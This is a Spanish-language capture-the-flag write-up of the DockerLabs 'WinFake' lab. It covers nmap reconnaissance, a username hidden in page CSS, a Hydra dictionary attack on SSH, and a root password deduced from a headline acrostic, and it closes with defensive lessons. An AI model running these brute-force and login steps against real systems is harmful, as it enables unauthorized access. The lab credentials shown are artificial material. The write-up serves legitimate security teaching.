# WinFake — DockerLabs (Fácil)

![maquina](https://github.com/Aguilar-aoj/Pentesting/blob/main/_visuales/DockerLabs/Facil/WinFake/maquina.png?raw=true)

A veces la primera pista de que algo no cuadra no está en un puerto ni en un exploit, sino en el propio disfraz de la máquina. **WinFake** se presenta como un servidor Windows, con un banner de PowerShell y una bienvenida de Microsoft, pero por debajo hay un Ubuntu bastante normal fingiendo ser otra cosa. El reto está en no fiarse de las apariencias: la web principal esconde un mensaje cifrado a la vista, y ese mensaje termina siendo la clave (literal) para llegar a root.

- **Dificultad:** Fácil
- **OS:** Linux (disfrazado de Windows)

## Planteamiento

El objetivo es comprometer la máquina desde cero hasta obtener acceso como root. Solo hay dos servicios expuestos: SSH y un servidor web con una supuesta página de noticias. La vía de entrada no pasa por ningún CVE ni por fuerza bruta a ciegas, sino por leer con atención el contenido y el código fuente de la web: ahí aparecen, escondidas, tanto una pista de usuario como el hilo del que tirar para deducir la contraseña de root. El "disfraz" de Windows en el SSH es puro decorado (banner falso) y no aporta nada técnico, solo confunde.

## Reconocimiento

Escaneo completo de puertos con **Nmap**:

```bash
sudo nmap -p- --open -sS -sC -sV -Pn -n --min-rate 5000 172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: TechWorld Noticias
```

Dos puertos abiertos:

- **22/tcp** — SSH, OpenSSH 9.6p1.
- **80/tcp** — HTTP, Apache 2.4.58, con el título "TechWorld Noticias".

## Enumeración Web (Puerto 80)

![puerto80](https://github.com/Aguilar-aoj/Pentesting/blob/main/_visuales/DockerLabs/Facil/WinFake/puerto80.png?raw=true)

La web simula un portal de noticias tipo *Daily News*. Nada llamativo a simple vista, pero al leer los titulares con más calma se aprecia un patrón: la primera letra de cada titular, leída en orden, forma una palabra oculta:

```
WINSERVERROOTFAKENEWS
```

Un acróstico bastante explícito para tratarse de una "casualidad" — claramente puesto ahí como pista.

### Revisión del código fuente

![code-puerto80](https://github.com/Aguilar-aoj/Pentesting/blob/main/_visuales/DockerLabs/Facil/WinFake/code-puerto80.png?raw=true)

Revisando el CSS de la página aparece una inconsistencia: en la propiedad `top` del selector `body`, en vez de un valor numérico con unidad (`px`, `em`, etc.), hay un valor de texto: **`pipe`**. Una propiedad CSS de posicionamiento no acepta ese tipo de valor, así que solo puede tratarse de un dato colado a propósito — muy probablemente un nombre de usuario.

## Análisis de Vulnerabilidades

Con dos pistas en la mano — un posible usuario (`pipe`) y una palabra clave sospechosa (`WINSERVERROOTFAKENEWS`) — el vector más directo es probar credenciales contra el servicio SSH expuesto, primero por fuerza bruta de contraseña sobre ese usuario, y después usando la palabra oculta como base para deducir la contraseña de root.

## Explotación

### 1. Ataque de diccionario contra SSH

Con el usuario `pipe` ya identificado, se lanza un ataque de fuerza bruta con **Hydra** contra el servicio SSH:

```bash
hydra -l pipe -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

```bash
[22][ssh] host: 172.17.0.2   login: pipe   password: kisses
1 of 1 target successfully completed, 1 valid password found
```

Contraseña encontrada: `kisses`.

### 2. Acceso inicial por SSH

```bash
ssh pipe@172.17.0.2
```

El banner de bienvenida simula un entorno Windows (PowerShell, mensaje de Microsoft), pero por debajo el sistema real es un Ubuntu 24.04.2 LTS. Con la contraseña obtenida se consigue el primer acceso como `pipe`.

### 3. Escalada de privilegios a root

El entorno inicial da la sensación de estar limitado (por el decorado de PowerShell), pero es una shell normal. Recordando la palabra oculta encontrada en la web (`WINSERVERROOTFAKENEWS`), se prueban variaciones manuales de capitalización y formato como posible contraseña de root, hasta dar con la combinación correcta:

```bash
su root
```

```
Password: WinServerRootFakeNews
```

```bash
root@0607c5033c7a:/home/pipe#
```

Acceso como **root** confirmado.

## Resumen de Credenciales

| Usuario | Contraseña              | Vía de obtención                                  |
|---------|--------------------------|----------------------------------------------------|
| pipe    | `kisses`                 | Fuerza bruta con Hydra (rockyou.txt)               |
| root    | `WinServerRootFakeNews`  | Acróstico en titulares web + prueba manual de casing |

## Qué falló aquí

- **Filtración de usuario por CSS inválido:** un valor de texto colado en una propiedad numérica (`top`) del CSS reveló el nombre de un usuario válido del sistema. Cualquier dato sensible, aunque esté "escondido" en el código fuente, es visible para quien inspeccione la página.
- **Pista de contraseña oculta en contenido público:** el acróstico en los titulares de la web filtraba directamente una contraseña (o la base de una) para una cuenta privilegiada. Ocultar información "a la vista" no es una medida de seguridad real.
- **Contraseña débil y reutilización de patrón:** `kisses` es una contraseña trivial de diccionario, y la contraseña de root es una variación previsible de una pista ya expuesta públicamente, lo que elimina cualquier valor real de la escalada.
- **Disfraz superficial sin hardening real:** simular un entorno Windows en el banner de bienvenida no aporta seguridad ni ofuscación efectiva; es únicamente cosmético y no dificulta un ataque real.

---

⚠️ Este contenido es exclusivamente educativo. No debe aplicarse en entornos reales sin autorización explícita.
